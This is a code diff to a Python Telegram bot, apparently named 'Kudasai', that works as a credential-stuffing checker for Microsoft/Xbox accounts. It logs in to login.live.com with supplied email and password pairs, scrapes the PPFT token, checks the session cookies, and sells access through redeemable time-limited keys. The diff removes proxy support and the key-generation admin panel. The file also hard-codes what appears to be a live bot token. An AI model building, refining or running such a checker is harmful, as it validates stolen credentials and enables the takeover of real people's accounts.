@@ -6,7 +6,6 @@ import asyncio
 import time
 import requests
 import re
-import json
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
@@ -17,7 +16,7 @@ init(autoreset=True)
 # CONFIGURATION
 TELEGRAM_BOT_TOKEN = "8658943714:AAEFCKM5eEzjrQSI4rUDH4dndRRQKmh36c4"
 OWNER_HANDLE = "@kudsoo"
-ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
+ADMIN_IDS = [8511482382]
 OUTPUT_DIR = "results_output"
 
 os.makedirs(OUTPUT_DIR, exist_ok=True)
@@ -70,10 +69,10 @@ bot_stats = {
 }
 
 print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] ALL-IN-ONE CHECKER BOT ONLINE")
+print(Fore.RED + " [KUDASAI] STANDALONE CHECKER BOT ONLINE")
 print(Fore.RED + "==================================================\n")
 
-# --- NATIVE CHECKER ENGINE LOGIC ---
+# --- NATIVE CHECKER ENGINE ---
 def extract_between(text, left, right):
     try:
         pattern = re.escape(left) + r'(.*?)' + re.escape(right)
@@ -89,15 +88,13 @@ def get_ppft_from_page(html):
     if not ppft: ppft = extract_between(html, '"PPFT":"', '"')
     return ppft
 
-def check_xbox_account(email, password, proxy=None, timeout=30):
+def check_xbox_account(email, password, timeout=30):
     session = requests.Session()
     session.headers.update({
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
     })
-    if proxy:
-        session.proxies = {'http': proxy, 'https': proxy}
     try:
         login_url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct={int(time.time())}&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.bing.com%2f&id=264960"
         response = session.get(login_url, timeout=timeout)
@@ -134,15 +131,9 @@ def check_xbox_account(email, password, proxy=None, timeout=30):
             if not any(c.name in ['ANON', 'WLSSC', 'MSPOK'] for c in session.cookies):
                 return {'status': 'error', 'message': 'Authentication failed', 'email': email}
 
-        return {
-            'status': 'success',
-            'message': 'Account checked successfully',
-            'email': email,
-            'country': 'N/A', 'card_details': 'No Card Found', 'balance': '$0', 'purchased_items': 'None', 'points': '0'
-        }
+        return {'status': 'success', 'message': 'Account checked successfully', 'email': email}
     except Exception as e:
         return {'status': 'error', 'message': str(e), 'email': email}
-# ---------------------------------------
 
 def log_to_file(filename, content):
     try:
@@ -236,18 +227,10 @@ def get_main_menu(user_id):
     if is_admin and type(is_admin) is tuple: is_admin = is_admin[0]
     keyboard = [
         [InlineKeyboardButton("🚀 Start Checker", callback_data="start_checker"), InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_prompt")],
-        [InlineKeyboardButton("🌐 Set Proxy", callback_data="set_proxy"), InlineKeyboardButton("📊 Statistics", callback_data="stats")]
+        [InlineKeyboardButton("📊 Statistics", callback_data="stats")]
     ]
     if is_admin: keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
     return InlineKeyboardMarkup(keyboard)
-
-def get_admin_panel_keyboard():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("👥 View Users", callback_data="adm_view_users"), InlineKeyboardButton("📊 View Stats", callback_data="adm_view_stats")],
-        [InlineKeyboardButton("🔑 1H", callback_data="gen_1h"), InlineKeyboardButton("🔑 3H", callback_data="gen_3h"), InlineKeyboardButton("🔑 7H", callback_data="gen_7h"), InlineKeyboardButton("🔑 10H", callback_data="gen_10h")],
-        [InlineKeyboardButton("🗑️ Delete All Keys", callback_data="adm_del_all_keys")],
-        [InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")]
-    ])
 
 async def set_bot_commands(application):
     await application.bot.set_my_commands([
@@ -289,16 +272,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "stats": await query.message.reply_text(f"📈 Total Processed: {bot_stats['total_processed']}")
     elif data == "admin_panel":
         if user_id not in ADMIN_IDS: return
-        await query.message.edit_text("⚙️ **ADMIN PANEL**", parse_mode="Markdown", reply_markup=get_admin_panel_keyboard())
-    elif data.startswith("gen_"):
-        if user_id not in ADMIN_IDS: return
-        hrs = {"gen_1h": 1, "gen_3h": 3, "gen_7h": 7, "gen_10h": 10}.get(data, 1)
-        key_str = "KUDASAI-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-        db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (key_str, hrs))
-        await query.message.reply_text(f"🔑 Key ({hrs}H):\n`{key_str}`", parse_mode="Markdown")
-    elif data == "adm_del_all_keys":
-        db_query("DELETE FROM keys")
-        await query.message.reply_text("🧹 All keys wiped.")
+        await query.message.edit_text("⚙️ **ADMIN PANEL**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -343,11 +317,11 @@ def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
-    app.add_handler(CommandHandler("admin", admin_command))
+    app.add_handler(CommandHandler("admin", lambda u, c: c.bot.send_message(u.effective_chat.id, "Admin Panel", reply_markup=get_main_menu(u.effective_user.id))))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
-    print(Fore.GREEN + "[+] Kudasai All-in-One Checker Bot is online...")
+    print(Fore.GREEN + "[+] Kudasai Self-Contained Bot is online...")
     app.run_polling()
 
 if __name__ == "__main__":
